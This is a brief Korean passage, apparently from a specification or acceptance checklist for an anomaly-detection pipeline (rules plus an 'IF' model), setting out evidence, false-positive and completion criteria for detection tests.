인증되지 않은 이벤트·유실·계측 손상을 정상 결과로 해석하지 않는다. Rule이 선별한 입력만 IF에 주었다면 그 분모 차이를 공개하고 독립 IF 성능을 원래 입력 기준으로 검증한다. 예외·과부하·전송 실패는 로컬 증거로 남기며 필수 IF/공식 공격 미달은 미완료다.

- [ ] ICD 검사와 Finding 근거·정상 오탐·독립 timer 검증
- [ ] 필수 IF·경보 경로와 Q2 생산/전달/소비 인수 상태 구분
- [ ] 공격 도구 사전 거부·시험용 sender 제어·A5/A6 보완 증거 인계
